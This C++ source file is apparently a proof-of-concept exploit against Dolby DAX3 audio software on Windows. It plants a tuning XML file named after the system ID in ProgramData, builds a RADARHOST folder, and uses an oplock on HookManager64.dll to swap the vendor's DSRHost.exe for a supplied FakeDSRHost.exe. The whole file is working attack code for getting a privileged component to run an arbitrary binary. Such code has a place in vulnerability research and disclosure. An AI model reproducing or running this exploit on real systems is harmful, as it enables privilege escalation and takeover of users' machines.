#include <stdio.h>
#include <conio.h>
#include <Windows.h>
#include <iostream>
#include <fstream>
#include <string>
#include <filesystem>
#include "dax3apipoc.h"
#pragma comment(lib, "ntdll.lib")

using namespace std;
namespace fs = std::filesystem;

// CHANGEME!
#define DAXSSID_PATH L"C:\\Windows\\System32\\DriverStore\\FileRepository\\dax3_swc_aposvc.inf_amd64_41de6367ef0679f0\\DAXSSID.dll"

#define DOLBY_PROGRAMDATA_PATH				L"C:\\ProgramData\\Dolby\\DAX3"
#define FAKE_DSRHOST_PATH					L"FakeDSRHost.exe"
#define DEFAULT_TUNING_FILENAME				L"default.xml"
#define OBJ_INHERIT                         0x00000002L
#define OBJ_PERMANENT                       0x00000010L
#define OBJ_EXCLUSIVE                       0x00000020L
#define OBJ_CASE_INSENSITIVE                0x00000040L
#define OBJ_OPENIF                          0x00000080L
#define OBJ_OPENLINK                        0x00000100L
#define OBJ_KERNEL_HANDLE                   0x00000200L
#define OBJ_FORCE_ACCESS_CHECK              0x00000400L
#define OBJ_IGNORE_IMPERSONATED_DEVICEMAP   0x00000800L
#define OBJ_DONT_REPARSE                    0x00001000L
#define OBJ_VALID_ATTRIBUTES                0x00001FF2L

#define DIRECTORY_QUERY 1

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG           Length;
	HANDLE          RootDirectory;
	PUNICODE_STRING ObjectName;
	ULONG           Attributes;
	PVOID           SecurityDescriptor;
	PVOID           SecurityQualityOfService;
} *POBJECT_ATTRIBUTES, OBJECT_ATTRIBUTES;

typedef VOID(NTAPI* RTLINITUNICODESTRING)(
	OUT PUNICODE_STRING DestinationString,
	IN	PCWSTR SourceString
	);

typedef NTSTATUS(NTAPI* NTOPENEVENT)(
	OUT PHANDLE EventHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes
	);

typedef NTSTATUS(WINAPI* NTOPENDIRECTORYOBJECT)(
	PHANDLE DirectoryHandle,
	ACCESS_MASK DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
	);

typedef NTSTATUS(WINAPI* NTCLOSE)(
	HANDLE Handle
	);

typedef BOOL(WINAPI* GETSSID)(
	OUT WCHAR* SystemId,
	IN DWORD MaxSystemIdLen
	);


#define InitializeObjectAttributes( p, n, a, r, s ) { \
    (p)->Length = sizeof( OBJECT_ATTRIBUTES );          \
    (p)->RootDirectory = r;                             \
    (p)->Attributes = a;                                \
    (p)->ObjectName = n;                                \
    (p)->SecurityDescriptor = s;                        \
    (p)->SecurityQualityOfService = NULL;               \
    }

NTOPENEVENT pfnNtOpenEvent = nullptr;
NTOPENDIRECTORYOBJECT pfnNtOpenDirectoryObject = nullptr;
NTCLOSE pfnNtClose = nullptr;
RTLINITUNICODESTRING RtlInitUnicodeString = nullptr;
HANDLE hFileDSRHost = nullptr;

namespace DAX3API {
	GETSSID GetSSID = nullptr;
}

int WrappedCreateEvent()
{
	const WCHAR *EventName = L"User-Logon-{FBC2B3C4-B045-40C2-8363-872A91F1C21D}";
	HANDLE hEvent = CreateEventW(0LL, 0, 0, EventName);
	if (!hEvent) {
		printf("[-] CreateEventW(\"%ws\") failed (0x%x)\n", EventName, GetLastError());
		return 0;
	}

	printf("[+] CreateEvent(\"%ws\") hEvent: 0x%x\n", EventName, hEvent);
	return 1;
}

int NativeCreateEvent()
{
	NTSTATUS status;
	HANDLE hEvent = NULL;
	WCHAR eventName[]  = L"User-Logon-{FBC2B3C4-B045-40C2-8363-872A91F1C21D}";
	//WCHAR objectDir[] = L"\\BaseNamedObjects\\User-Logon-{FBC2B3C4-B045-40C2-8363-872A91F1C21D}";
	WCHAR baseNamedObjects[] = L"\\BaseNamedObjects";
	UNICODE_STRING directoryName;
	OBJECT_ATTRIBUTES oa;
	UNICODE_STRING eventDirectoryName;

	memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
	memset(&eventDirectoryName, 0, sizeof(eventDirectoryName));
	memset(&directoryName, 0, sizeof(directoryName));

	pfnNtOpenEvent = (NTOPENEVENT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenEvent");

	if (!pfnNtOpenEvent)
	{
		printf("[-] GetProcAddress(NtOpenEvent) failed (0x%x)\n", GetLastError());
		return 0;
	}

	pfnNtOpenDirectoryObject = (NTOPENDIRECTORYOBJECT)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtOpenDirectoryObject");

	if (!pfnNtOpenDirectoryObject)
	{
		printf("[-] GetProcAddress(NtOpenDirectoryObject) failed (0x%x)\n", GetLastError());
		return 0;
	}

	pfnNtClose = (NTCLOSE)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtClose");

	if (!pfnNtClose)
	{
		printf("[-] GetProcAddress(NtClose) failed (0x%x)\n", GetLastError());
		return 0;
	}

	RtlInitUnicodeString = (RTLINITUNICODESTRING)GetProcAddress(GetModuleHandleA("ntdll.dll"), "RtlInitUnicodeString");

	if (!RtlInitUnicodeString)
	{
		printf("[-] GetProcAddress(RtlInitUnicodeString) failed (0x%x)\n", GetLastError());
		return 0;
	}

	RtlInitUnicodeString(&directoryName, L"\\BaseNamedObjects");
	InitializeObjectAttributes(&oa, &directoryName, OBJ_CASE_INSENSITIVE, nullptr, nullptr);
	
	HANDLE hDirectory = NULL;
	status = pfnNtOpenDirectoryObject(&hDirectory, DIRECTORY_QUERY, &oa);

	if (status < 0)
	{
		wprintf(L"[-] Cannot get the directory object for \"%ws\" (0x%x)\n", baseNamedObjects, status);
		return 0;
	}

	RtlInitUnicodeString(&eventDirectoryName, eventName);

	memset(&oa, 0, sizeof(OBJECT_ATTRIBUTES));
	InitializeObjectAttributes(&oa, &eventDirectoryName, OBJ_CASE_INSENSITIVE, hDirectory, nullptr);

	status = pfnNtOpenEvent(&hEvent, EVENT_MODIFY_STATE, &oa);

	if (status < 0)
	{
		wprintf(L"[-] Cannot open the event for \"%ws\\%ws\" (0x%x)\n", baseNamedObjects, eventName, status);
		return 0;
	}

	printf("[+] Opened hEvent: 0x%llx\n", (UINT64)hEvent);
	return 1;
}

void HandleOplock()
{
	char msg[256];
	std::wstring dax3path(DOLBY_PROGRAMDATA_PATH);
	std::wstring radarHostPath = dax3path + L"\\RADARHOST";
	std::wstring dsrHost = radarHostPath + L"\\DSRHost.exe";

	if (!fs::exists(dsrHost.c_str())) {
		_snprintf_s(msg, 256, "[-] %ws not found\n", dsrHost.c_str());
		msg[255] = '\0';
		OutputDebugStringA(msg);
		return;
	}

	// Terminate the exclusive DSRHost.exe handle
	CloseHandle(hFileDSRHost);
	
	// Now we are free to replace DSRHost.exe to arbitrary content
	DeleteFileW(dsrHost.c_str());
	CopyFileW(L"FakeDSRHost.exe", dsrHost.c_str(), false);
	return;
}

BOOL findDAXSSID(CHAR* folderPath) {
	WIN32_FIND_DATAA findFileData;
	HANDLE hFind;
	char searchPath[MAX_PATH];

	// Construct the search path pattern
	sprintf_s(searchPath, MAX_PATH, "%s\\DAXSSID.dll", folderPath);

	// Start searching for the file
	hFind = FindFirstFileA(searchPath, &findFileData);

	if (hFind == INVALID_HANDLE_VALUE) {
		printf("[-] Error searching for DAXSSID.dll in %s\n", folderPath);
		return false;
	}

	// Output the found file information
	printf("[+] Found DAXSSID.dll in folder %s\n", folderPath);
	strcpy_s(folderPath, MAX_PATH, searchPath);

	// Close the search handle
	FindClose(hFind);

	return true;
}

BOOL GetDAXSSIDPath(CHAR* DaxSSIDPath)
{
	// Specify the base folder path
	const char* basePath = "C:\\Windows\\System32\\DriverStore\\FileRepository\\";

	// The specific folder name (e.g., "dax3_swc_aposvc.inf_amd64_41de6367ef0679f0") can vary
	const char* specificFolderName = "dax3_swc_aposvc.inf_amd64_";

	// Generate the full path to the folder
	char folderPath[MAX_PATH];
	sprintf_s(folderPath, MAX_PATH, "%s%s*", basePath, specificFolderName);

	// Use FindFirstFile and FindNextFile to find DAXSSID.dll
	WIN32_FIND_DATAA findFolderData;
	HANDLE hFindFolder = FindFirstFileA(folderPath, &findFolderData);

	if (hFindFolder == INVALID_HANDLE_VALUE) {
		printf("Error finding folders in %s\n", basePath);
		return 1;
	}

	do {
		// Skip non-directories
		if (!(findFolderData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY)) {
			continue;
		}

		// Exclude . and .. directories
		if (strcmp(findFolderData.cFileName, ".") == 0 || strcmp(findFolderData.cFileName, "..") == 0) {
			continue;
		}

		// Construct full path to the specific folder
		sprintf_s(folderPath, MAX_PATH, "%s%s\\", basePath, findFolderData.cFileName);

		// Search for DAXSSID.dll within this folder
		if (findDAXSSID(folderPath)) {
			strcpy_s(DaxSSIDPath, MAX_PATH, folderPath);
			break;
		}

	} while (FindNextFileA(hFindFolder, &findFolderData) != 0);

	// Close the folder search handle
	FindClose(hFindFolder);

	return true;
}
int main(int argc, char *argv[])
{
	wchar_t SystemId[MAX_PATH];
	printf("[+] Enter DAX3API POC\n");
	//NativeCreateEvent();
	/*WrappedCreateEvent();
	_getch();*/
	std::wstring programData(DOLBY_PROGRAMDATA_PATH);
	std::wstring radarHostPath = programData + L"\\RADARHOST";
	std::wstring fakeDSRHost(FAKE_DSRHOST_PATH);
	if (!fs::exists(fakeDSRHost)) {
		printf("[-] %ws must be placed in the same directory of target POC %s\n", fakeDSRHost.c_str(), argv[0]);
		return 0;
	}

	// Use DAXSSID.dll to retrieve the SSID
	CHAR daxssidPath[MAX_PATH];
	memset(daxssidPath, 0, MAX_PATH);
	if (!GetDAXSSIDPath(daxssidPath)) {
		printf("[-] Failed to determine DAX3SSID.dll path\n");
		return 0;
	}

	DAX3API::GetSSID = (GETSSID)GetProcAddress(LoadLibraryA(daxssidPath), "GetSSID");
	if (!DAX3API::GetSSID) {
		printf("[-] Failed to resolve API GetSSID (0x%x)\n", GetLastError());
		return 0;
	}

	if (!DAX3API::GetSSID(SystemId, _MAX_PATH)) {
		printf("[*] Failed to call GetSSID (0x%x)\n", GetLastError());
		printf("[*] Use \"default\" as SSID instead\n");
		return 0;
	}

	printf("[+] SSID: %ws\n", SystemId);

	// Open input file 
	std::wstring inputFilePath(DEFAULT_TUNING_FILENAME);
	std::ifstream inputFile(inputFilePath);
	if (!inputFile.is_open()) {
		printf("[-] Failed to open default.xml file in the current directory (0x%x)\n", GetLastError());
		return 0;
	}

	// Open output file
	std::wstring systemId(SystemId);
	std::wstring outputFilePath = programData + L"\\" + systemId + L".xml";
	std::ofstream outputFile(outputFilePath);
	if (!outputFile.is_open()) {
		printf("[-] Failed to open \"%ws\" (0x%x)\n", outputFilePath.c_str(), GetLastError());
		inputFile.close();  // Close the input file before exiting
		return 0;
	}

	// Read content from input file and write it to output file
	std::string line;
	while (std::getline(inputFile, line)) {
		outputFile << line << std::endl;
	}

	// Close files
	inputFile.close();
	outputFile.close();
	printf("[+] \"%ws\" was created successfully\n", outputFilePath.c_str());

	if (fs::exists(radarHostPath) && fs::is_directory(radarHostPath)) {
		printf("[-] \"%ws\" must be empty for the POC to proceed\n", radarHostPath.c_str());
		return 0;
	}
	else if (CreateDirectoryW(radarHostPath.c_str(), NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
		printf("[+] Directory created successfully: %ws\n", radarHostPath.c_str());
	}
	else {
		printf("[-] Failed to create directory \"%ws\" (0x%x)\n", radarHostPath.c_str(), GetLastError());
		return 0;
	}

	std::wstring dsrHost = radarHostPath + L"\\DSRHost.exe";
	hFileDSRHost = CreateFileW(dsrHost.c_str(), GENERIC_READ | GENERIC_WRITE, 0/*Exclusive file handle*/, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFileDSRHost == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create file: %ws (0x%x)\n", dsrHost.c_str(), GetLastError());
		return 0;
	}

	printf("[+] \"%ws\" created successfully\n", dsrHost.c_str());

	std::wstring hookManager = radarHostPath + L"\\HookManager64.dll";
	HANDLE hFile = CreateFileW(hookManager.c_str(), GENERIC_READ | GENERIC_WRITE, 0/*Exclusive file handle*/, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
	if (hFile == INVALID_HANDLE_VALUE) {
		printf("[-] Failed to create file: %ws (0x%x)\n", hookManager.c_str(), GetLastError());
		return 0;
	}
	CloseHandle(hFile);
	printf("[+] \"%ws\" created successfully\n", hookManager.c_str());

	// HookManagerXX.dll turns out to be the last item to be extracted from Res.zip based on the dynamic test result
	printf("[+] Setting up oplock: %ws\n", hookManager.c_str());
	SetOpLock(hookManager.c_str(), L"w", HandleOplock);
	
	return 1;
}